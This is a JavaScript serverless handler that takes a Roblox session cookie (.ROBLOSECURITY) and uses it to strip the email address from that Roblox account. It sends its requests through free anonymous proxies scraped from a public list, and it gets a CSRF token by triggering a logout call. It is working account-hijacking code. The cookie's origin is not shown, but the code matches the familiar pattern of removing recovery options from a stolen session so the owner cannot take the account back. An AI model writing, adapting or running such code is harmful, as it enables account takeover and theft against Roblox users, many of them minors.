const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

module.exports = async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();

    const { cookie } = req.body;
    if (!cookie) return res.status(400).json({ success: false, message: 'Cookie is required.' });

    const cleanCookie = cookie.replace(/[^a-zA-Z0-9_\-|:.]/g, '');
    
    const baseHeaders = {
        'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Origin': 'https://www.roblox.com',
        'Referer': 'https://www.roblox.com/'
    };

    try {
        const proxyRes = await axios.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=2000&country=all&ssl=all&anonymity=all');
        const proxies = proxyRes.data.split('\n').map(p => p.trim()).filter(p => p.length > 0);

        if (proxies.length === 0) {
             return res.status(500).json({ success: false, message: 'Could not fetch proxies.' });
        }

        // Try max 4 proxies to stay under Vercel's 10-second limit
        for (let i = 0; i < Math.min(proxies.length, 4); i++) {
            const agent = new HttpsProxyAgent(`http://${proxies[i]}`);
            
            try {
                const authCheck = await axios.get('https://users.roblox.com/v1/users/authenticated', { 
                    headers: baseHeaders, httpsAgent: agent, proxy: false, timeout: 1500 
                });

                if (authCheck.status === 200) {
                    let csrfToken = '';
                    try {
                        await axios.post('https://auth.roblox.com/v2/logout', {}, { headers: baseHeaders, httpsAgent: agent, proxy: false, timeout: 1500 });
                    } catch (err) {
                        if (err.response && err.response.headers['x-csrf-token']) {
                            csrfToken = err.response.headers['x-csrf-token'];
                        } else {
                            continue; 
                        }
                    }

                    try {
                        await axios.post('https://accountsettings.roblox.com/v1/email', { emailAddress: "" }, { 
                            headers: { ...baseHeaders, 'X-CSRF-TOKEN': csrfToken }, 
                            httpsAgent: agent, proxy: false, timeout: 1500 
                        });
                        
                        return res.status(200).json({ success: true, data: { messages: ["Email successfully wiped."] } });
                    } catch (err) {
                        if (err.response && err.response.status === 403) {
                            return res.status(200).json({ success: false, data: { messages: ["Blocked: Roblox requires password for this endpoint."] } });
                        }
                    }
                }
            } catch (err) {
                continue; 
            }
        }

        res.status(500).json({ success: false, message: 'All proxies failed or timed out.' });

    } catch (error) {
        res.status(500).json({ success: false, message: 'Internal Error', error: error.message });
    }
}
